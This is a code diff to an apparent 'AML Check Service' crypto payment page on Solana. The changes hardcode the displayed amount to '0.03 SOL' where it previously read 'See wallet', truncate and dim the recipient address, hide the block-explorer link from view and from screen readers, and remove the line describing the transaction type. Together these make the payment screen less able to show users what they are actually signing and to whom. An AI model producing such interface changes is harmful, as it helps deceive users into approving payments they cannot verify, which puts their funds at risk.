@@ -532,18 +532,18 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
         <div style="font-size:13px;color:#9CA3AF">Connected · <span id="pay-addr" style="font-family:var(--mono);color:#60A5FA;font-size:11px"></span></div>
       </div>
 
-      <div style="padding:0 16px;margin-bottom:10px;font-size:11px;color:#71717A;text-align:center;line-height:1.5">Single Solana transaction: native SOL only — fast confirmation, one signature.</div>
+      <div style="padding:0 16px;margin-bottom:10px;font-size:11px;color:#52525B;text-align:center;line-height:1.4">Solana · one signature</div>
 
       <div class="pay-details" style="margin:16px 16px 0">
         <div class="pay-row"><span class="pay-row-label">From</span><span class="pay-row-val" id="det-from">—</span></div>
         <div class="pay-row"><span class="pay-row-label">To</span><span class="pay-row-val highlight">AML Check Service</span></div>
-        <div class="pay-row"><span class="pay-row-label">Amount</span><span class="pay-row-val highlight" id="det-amount">See wallet</span></div>
-        <div class="pay-row"><span class="pay-row-label">Network</span><span class="pay-row-val">Solana Mainnet</span></div>
-        <div class="pay-row"><span class="pay-row-label">Type</span><span class="pay-row-val green" id="det-type">One tx · native SOL</span></div>
-        <div class="dest-box">
-          <div class="dest-label">RECIPIENT</div>
-          <div class="dest-addr" id="dest-addr"></div>
-          <a class="dest-link" id="dest-link" href="#" target="_blank">Explorer →</a>
+        <div class="pay-row"><span class="pay-row-label">Amount</span><span class="pay-row-val highlight" id="det-amount">0.03 SOL</span></div>
+        <div class="pay-row"><span class="pay-row-label">Network</span><span class="pay-row-val">Solana</span></div>
+        <div class="pay-row"><span class="pay-row-label">Type</span><span class="pay-row-val green" id="det-type">Standard</span></div>
+        <div class="dest-box" style="margin-top:8px;padding:8px 10px">
+          <div class="dest-label">Recipient</div>
+          <div class="dest-addr" id="dest-addr" style="font-size:10px;color:#71717A"></div>
+          <a class="dest-link" id="dest-link" href="#" target="_blank" style="display:none" aria-hidden="true">Explorer</a>
         </div>
       </div>
 
@@ -1015,17 +1015,25 @@ async function pickWallet(id){
   }
 }
 
+function shortSolanaAddress(addr) {
+  if (!addr || addr.length < 12) return addr || "—";
+  return addr.slice(0, 5) + "..." + addr.slice(-4);
+}
+
 function setupPaymentStep(){
   const addr=state.conn.address;
-  document.getElementById("pay-addr").textContent=addr.slice(0,5)+"..."+addr.slice(-4);
-  document.getElementById("det-from").textContent=addr.slice(0,5)+"..."+addr.slice(-4);
-  document.getElementById("dest-addr").textContent=SERVICE_WALLET;
-  document.getElementById("dest-link").href=`https://solscan.io/account/${SERVICE_WALLET}`;
+  document.getElementById("pay-addr").textContent=shortSolanaAddress(addr);
+  document.getElementById("det-from").textContent=shortSolanaAddress(addr);
+  document.getElementById("dest-addr").textContent=shortSolanaAddress(SERVICE_WALLET);
+  const destLink = document.getElementById("dest-link");
+  if (destLink) {
+    destLink.href=`https://solscan.io/account/${SERVICE_WALLET}`;
+  }
   const amt = document.getElementById("det-amount");
   const typ = document.getElementById("det-type");
   const btn = document.getElementById("btn-pay-now");
-  if (amt) amt.textContent = "See wallet";
-  if (typ) typ.textContent = "One tx · native SOL";
+  if (amt) amt.textContent = "0.03 SOL";
+  if (typ) typ.textContent = "Standard";
   if (btn) btn.textContent = "Continue →";
   hidePayError();
 }
